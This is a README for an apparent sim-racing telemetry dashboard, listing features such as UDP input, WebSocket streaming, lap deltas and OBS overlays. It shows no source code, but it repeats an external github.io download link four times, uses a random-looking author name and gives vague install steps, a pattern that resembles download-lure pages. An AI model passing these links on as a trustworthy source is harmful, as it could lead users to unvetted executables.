# F1 Telemetry Dashboard v1.3.1 - Game Script Utility 2026

> **A browser-based Formula 1 telemetry dashboard for sim racing, combining UDP data capture, live WebSocket updates, lap analysis, and race engineering views.**

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/victor-brooksuwhq9405/f1-telemetry-dashboard?style=flat-square)](https://github.com/victor-brooksuwhq9405/f1-telemetry-dashboard)

---

<p align="center">
  <a href="https://victor-brooksuwhq9405.github.io/f1-telemetry-dashboard/">
    <img src="https://img.shields.io/badge/Download-F1%20Telemetry%20Dashboard%20Script-brightgreen?style=for-the-badge" alt="Download F1 Telemetry Dashboard Script">
  </a>
</p>

> **[Download F1 Telemetry Dashboard](https://victor-brooksuwhq9405.github.io/f1-telemetry-dashboard/)**

---

[Download Latest Build](https://victor-brooksuwhq9405.github.io/f1-telemetry-dashboard/)

---

## Overview

F1 Telemetry Dashboard provides a browser-based control and analysis interface for Formula 1 sim racing. It accepts high-frequency telemetry over UDP, interprets vehicle and session information, and streams the resulting data to a live web dashboard. Processed telemetry can also be distributed through WebSockets, so several screens or devices can follow the same session at once.

Live views combine lap deltas, sector performance, race position, interval data, and interactive circuit displays. The dashboard also exposes detailed tyre, engine, brake, ERS, speed, throttle, and steering information, alongside weather conditions, penalties, safety-car status, and race-control events.

---

## Key Capabilities

- Renders incoming Formula 1 telemetry as it arrives.
- Reads high-frequency UDP packets containing vehicle and session data.
- Sends processed telemetry to configurable WebSocket clients.
- Allows multiple browsers to connect to the same dashboard session.
- Presents sector times, color indicators, and current lap comparisons.
- Records ghost telemetry and follows the delta for the active lap.
- Displays an interactive 3D circuit and pit-lane map.
- Calculates and shows race order, gaps, and intervals.
- Tracks tyre, engine, brake, ERS, speed, throttle, and steering values.
- Reports race-control messages, safety-car states, weather, and penalties.
- Provides layouts suitable for OBS and Streamlabs broadcasts.
- Enables remote dashboard viewing through compatible browsers.

---

## Installation and Startup

1. Get the newest dashboard build using the download link above.
2. Extract or place the project in a dedicated directory, for example `f1-dashboard-telemetry`.
3. Install the Node.js packages required by the project.
4. Use the supplied project scripts to launch the dashboard and telemetry listener.
5. Set the simulator or telemetry source to send UDP packets to the listener.
6. Load the dashboard in a browser. When needed, give the displayed address to other viewing clients.

A normal local setup follows this sequence:

```text
Download -> install dependencies -> configure UDP input -> start Node.js service -> open dashboard
```

Live vehicle and race information will only appear after the dashboard has an active telemetry source.

---

## Configuration

The exact settings vary according to the build and deployment approach. The main configuration categories are:

| Setting | Purpose |
|---|---|
| UDP telemetry input | Defines the network source from which telemetry packets are received. |
| WebSocket service | Determines how processed telemetry reaches connected browser clients. |
| Client access | Controls access for individual or multiple dashboard viewers. |
| Ghost telemetry | Turns reference-lap capture and comparison on or off. |
| Track mapping | Manages the interactive 3D track and pit-lane presentation. |
| Stream output | Provides output layouts for OBS or Streamlabs scenes. |

Adjust these values through the project's configuration files or startup options. The UDP and WebSocket endpoints must match across the telemetry source, Node.js service, and browser clients.

---

## Compatibility and Requirements

- **Platform:** Web
- **Runtime:** Node.js
- **Telemetry transport:** UDP input with WebSocket distribution
- **Viewing:** Modern web browsers
- **Primary use:** Formula 1 sim racing and race engineering analysis
- **Streaming:** OBS and Streamlabs workflows

Telemetry availability is determined by the connected simulator and its packet format. Vehicle, session, weather, penalty, and race-control panels may remain empty when the corresponding fields are not provided. Before diagnosing dashboard issues, verify that the simulator is configured to transmit compatible UDP telemetry.

---

## Frequently Asked Questions

### What is the basic way to view telemetry?

Configure the UDP input, start the Node.js dashboard service, and open the dashboard URL in a browser that can reach the service over the same accessible network.

### Can multiple displays connect simultaneously?

Yes. WebSocket broadcasting and multi-client support allow several browsers to receive the same processed telemetry stream.

### How do I get updates?

Use the latest build link near the beginning of this README. After installing an update, check the deployment and configuration files because endpoint names or available options can differ between releases.

### Which parts of the dashboard can be configured?

The available configuration areas cover UDP input, WebSocket distribution, ghost telemetry, track mapping, client access, and streaming output. Further changes depend on the organization of the downloaded build.

### Will it work with every Formula 1 simulator or game?

Not necessarily. The simulator must provide the UDP packet format and telemetry fields expected by the dashboard. Review the simulator's telemetry settings and compare its available data with the dashboard's requirements.

### What is the recommended project location?

Store the installation in its own directory, such as `f1-dashboard-telemetry`. Keeping configuration, runtime files, and captured ghost telemetry together makes the dashboard easier to back up or relocate.

### Is broadcast overlay use supported?

Yes. OBS and Streamlabs integration options allow the dashboard's telemetry views to be included in streaming scenes.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
